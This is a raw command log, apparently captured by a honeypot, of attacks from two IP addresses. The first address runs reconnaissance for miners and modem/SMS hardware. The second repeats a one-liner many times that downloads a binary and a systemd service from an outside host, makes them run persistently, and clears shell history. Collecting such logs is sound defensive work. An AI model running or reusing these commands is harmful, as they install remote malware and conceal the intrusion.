start
2024-12-10 19:37:25.634508 - ('210.107.13.178', 49944) - /ip cloud print
2024-12-10 19:37:27.322481 - ('210.107.13.178', 49944) - ifconfig
2024-12-10 19:37:28.618959 - ('210.107.13.178', 49944) - uname -a
2024-12-10 19:37:29.918544 - ('210.107.13.178', 49944) - cat /proc/cpuinfo
2024-12-10 19:37:31.213921 - ('210.107.13.178', 49944) - ps | grep '[Mm]iner'
2024-12-10 19:37:32.514457 - ('210.107.13.178', 49944) - ps -ef | grep '[Mm]iner'
2024-12-10 19:37:33.814056 - ('210.107.13.178', 49944) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 19:37:35.110576 - ('210.107.13.178', 49944) - echo Hi | cat -n
2024-12-10 23:35:51.845165 - ('45.148.10.203', 32790) - apt
2024-12-10 23:35:53.116412 - ('45.148.10.203', 32790) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:00.206917 - ('45.148.10.203', 32794) - apt
2024-12-10 23:36:01.358907 - ('45.148.10.203', 32794) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:08.260159 - ('45.148.10.203', 52118) - apt
2024-12-10 23:36:09.336117 - ('45.148.10.203', 52118) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:16.259804 - ('45.148.10.203', 48076) - apt
2024-12-10 23:36:17.467033 - ('45.148.10.203', 48076) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:24.379270 - ('45.148.10.203', 37172) - apt
2024-12-10 23:36:25.455882 - ('45.148.10.203', 37172) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:32.402269 - ('45.148.10.203', 39674) - apt
2024-12-10 23:36:33.494453 - ('45.148.10.203', 39674) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:40.590598 - ('45.148.10.203', 60282) - apt
2024-12-10 23:36:41.870709 - ('45.148.10.203', 60282) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:48.806785 - ('45.148.10.203', 60290) - apt
2024-12-10 23:36:49.896575 - ('45.148.10.203', 60290) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:36:56.813241 - ('45.148.10.203', 46062) - apt
2024-12-10 23:36:58.014903 - ('45.148.10.203', 46062) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:04.928172 - ('45.148.10.203', 34334) - apt
2024-12-10 23:37:06.138606 - ('45.148.10.203', 34334) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:13.080038 - ('45.148.10.203', 40230) - apt
2024-12-10 23:37:14.180879 - ('45.148.10.203', 40230) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:21.293344 - ('45.148.10.203', 54498) - apt
2024-12-10 23:37:22.446452 - ('45.148.10.203', 54498) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:29.244583 - ('45.148.10.203', 54506) - apt
2024-12-10 23:37:30.456750 - ('45.148.10.203', 54506) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:37.554125 - ('45.148.10.203', 44322) - apt
2024-12-10 23:37:38.709516 - ('45.148.10.203', 44322) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:45.845783 - ('45.148.10.203', 53460) - apt
2024-12-10 23:37:47.131322 - ('45.148.10.203', 53460) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:54.111715 - ('45.148.10.203', 59060) - apt
2024-12-10 23:37:55.340146 - ('45.148.10.203', 59060) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:02.276068 - ('45.148.10.203', 59376) - apt
2024-12-10 23:38:03.370710 - ('45.148.10.203', 59376) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:10.320149 - ('45.148.10.203', 59568) - apt
2024-12-10 23:38:11.538300 - ('45.148.10.203', 59568) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:18.652003 - ('45.148.10.203', 59576) - apt
2024-12-10 23:38:19.936317 - ('45.148.10.203', 59576) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:27.062103 - ('45.148.10.203', 35394) - apt
2024-12-10 23:38:28.219266 - ('45.148.10.203', 35394) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:35.168249 - ('45.148.10.203', 40766) - apt
